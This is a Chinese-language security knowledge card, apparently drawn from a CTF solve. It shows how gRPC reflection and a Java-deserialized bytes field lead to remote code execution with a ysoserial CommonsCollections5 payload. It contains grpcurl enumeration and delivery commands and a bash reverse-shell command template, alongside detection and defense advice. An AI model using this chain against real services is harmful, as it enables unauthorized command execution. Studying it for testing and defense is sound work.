---
id: web-java-deserialization-grpc-bytes-field-ysoserial
title: gRPC bytes 字段承载 Java 原生序列化：grpcurl 枚举 + ysoserial CC5 RCE
type: scenario
domain: web
path: web/java/deserialization
technique: grpc-bytes-field-java-deserialization
aliases:
- gRPC 反序列化
- grpcurl 枚举
- serializeData 字段
- invalid stream header
- ysoserial gRPC
- gRPC Java RCE
- protobuf bytes 反序列化
tags:
- java
- deserialization
- grpc
- protobuf
- ysoserial
- rce
- grpcurl
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V604
  verified_at: '2026-11-12T18:39:52+08:00'
  notes: '已对照原文与全部8图核对：正文 Happygame 用 grpcurl list/describe 枚举出 helloworld.Greeter.ProcessMsg 与 message Request { bytes serializeData = 1; }，发送 base64 后报 invalid stream header: 088BB7BD，判断为 Java 原生反序列化（此前 Python 尝试仅报同一条流头错误）；随后 ysoserial-all.jar CommonsCollections5 生成 payload、base64 后经 grpcurl -d ''{"serializeData":"..."}'' 投递，图02 显示 nc 2333 收到 root@engine-1:/opt/app# 反弹 shell（目录含 happygame.jar），cat /flag 得 flag{2455863f-4907-4374-83cb-d2c4218e021c}，RCE 链成立。修正一处措辞：088BB7BD 是传入 bytes 字段值的前4字节，并非“protobuf 编码的字段字节”，已改。affected_versions 留空正确：原文无组件版本。dedup 报告判 new，唯一 related 为 ysoserial JRMPListener 二次利用卡，机制不同，非同链，保留。未验证点：服务端未给源码，ObjectInputStream 实现由报错指纹推断；未本地复现。'
---

## 一句话结论

当 gRPC 服务的 protobuf 消息把某个字段定义为 `bytes`、服务端又把这些字节直接交给 Java `ObjectInputStream` 反序列化时，攻击者可用 grpcurl（配合已开启的 gRPC reflection）枚举服务与方法、找到该字段，再把 ysoserial 生成的 CommonsCollections 等 gadget 链 Base64 后放进 `serializeData` 发送，即可在服务端执行任意命令。

## 原理

- **gRPC reflection 暴露接口**：开启 `grpc.reflection.v1alpha.ServerReflection` 时，grpcurl 无需 .proto 文件即可 `list` 服务、`describe` 方法与消息结构，看到类似 `rpc ProcessMsg(.helloworld.Request) returns (.helloworld.Reply)`、`message Request { bytes serializeData = 1; }`。
- **bytes 字段就是 byte[]**：protobuf 的 `bytes` 在 Java 中映射为 `byte[]`；若服务端实现直接 `new ObjectInputStream(new ByteArrayInputStream(request.getSerializeData())).readObject()`，该字段就是原生反序列化入口。
- **报错指纹**：向该字段发送任意字节时，Java `ObjectInputStream` 会检查流头 `AC ED 00 05`；不匹配时报 `invalid stream header: <前4字节hex>`（如 `invalid stream header: 088BB7BD`，其中 `08 8B B7 BD` 正是传入 bytes 字段值的前 4 个字节；只要不以 `AC ED 00 05` 开头都会触发）。这条报错是确认“Java 原生反序列化”的强信号。
- **为什么用 ysoserial**：目标 classpath 若包含 CommonsCollections 等库，`CommonsCollections5` 等链可在 `readObject` 时执行命令；把 payload 用 `| base64` 编码（去掉换行）后填入 `serializeData`，gRPC 会原样把 bytes 交给反序列化入口。
- **常见来源**：微服务/网关把“上游传来的二进制消息”当作 Java 对象透传、RMI/消息队列/缓存反序列化封装成 gRPC 接口、或调试接口直接暴露 `bytes` 字段。

## 触发条件

- gRPC 服务可达，且 reflexion 开启（或能拿到 .proto 文件）。
- 存在接收 `bytes` 字段并直接做 Java 原生反序列化的方法。
- 目标 classpath 有可用 gadget 链（如 CommonsCollections）。
- 攻击机可运行 grpcurl 与 ysoserial，且能接收反弹 Shell/回显。

## 利用步骤

1. 用 grpcurl 枚举：`grpcurl -plaintext <host>:<port> list`，再 `list <service>`、`describe <service>.<method>`、`describe <message>`。
2. 找到 `bytes` 字段（如 `serializeData`）和对应 RPC 方法。
3. 先发任意字节确认反序列化：构造 base64 随机值，观察 `invalid stream header` 报错。
4. 生成 payload：`java -jar ysoserial-all.jar CommonsCollections5 '<command>' | base64 -w0`（去掉换行）。
5. 用 grpcurl 发送：`-d '{"serializeData":"<base64>"}' <host>:<port> <service>.<method>`。
6. 在监听端接收反弹 Shell 或命令回显；按授权范围验证后停止。

## PoC

```bash
# 枚举
docker run fullstorydev/grpcurl -plaintext <host>:<port> list
docker run fullstorydev/grpcurl -plaintext <host>:<port> list helloworld.Greeter
docker run fullstorydev/grpcurl -plaintext <host>:<port> describe helloworld.Greeter.ProcessMsg
docker run fullstorydev/grpcurl -plaintext <host>:<port> describe helloworld.Request

# 生成 ysoserial payload（Base64 单行）
java -jar ysoserial-all.jar CommonsCollections5 'bash -c {echo,<base64-cmd>}|{base64,-d}|{bash,-i}' | base64 -w0

# 发送
docker run fullstorydev/grpcurl -plaintext \
  -d '{"serializeData":"<base64-payload>"}' <host>:<port> helloworld.Greeter.ProcessMsg
```

若返回 `invalid stream header: 088BB7BD`，说明字段被当作 Java 序列化流处理；换成以 `AC ED 00 05` 开头的 ysoserial payload 即可。

## 变体与关联

- **变体（入口）**：任何把 `bytes`/`ByteString` 直接反序列化的 RPC；RMI、JMS、Redis 缓存、HTTP body 的 Java 原生反序列化同理。
- **变体（gadget）**：CommonsCollections 1-7、CommonsBeanutils、Groovy、JDK7u21 等，按 classpath 选择。
- **变体（无 reflection）**：拿到 .proto 或用 gRPC 生态工具从服务端反射/文档恢复消息结构。
- **关联**：[[web-java-deser-commonscollections-cc5-badattribute-tostring]]（CC5 基础链）、[[web-java-deserialization-axis-wsdd-hidden-service-readobject]]（另一种隐藏服务暴露 readObject）、[[web-generic-auth-qdrant-internal-grpc-auth-bypass]]（gRPC 服务暴露面）。
- **边界**：服务端使用 protobuf/json 而非 Java 原生序列化、配置 `ObjectInputFilter`/类白名单、reflection 关闭且无 .proto、classpath 无 gadget 时，链不成立。

## 检测与防御

- **根因修复**：不要把不可信 `bytes` 交给 `ObjectInputStream`；改用 protobuf/json 等安全序列化，或对反序列化做严格类白名单（`ObjectInputFilter`）。
- **收缩面**：生产环境关闭 gRPC reflection；对 gRPC 接口鉴权与来源限制。
- **检测**：gRPC 请求的 `bytes` 字段以 `AC ED 00 05` 开头；服务端出现 `invalid stream header` 报错；ysoserial 特征类名（`CommonsCollections5`、`TemplatesImpl` 等）；gRPC 端点异常高频枚举。
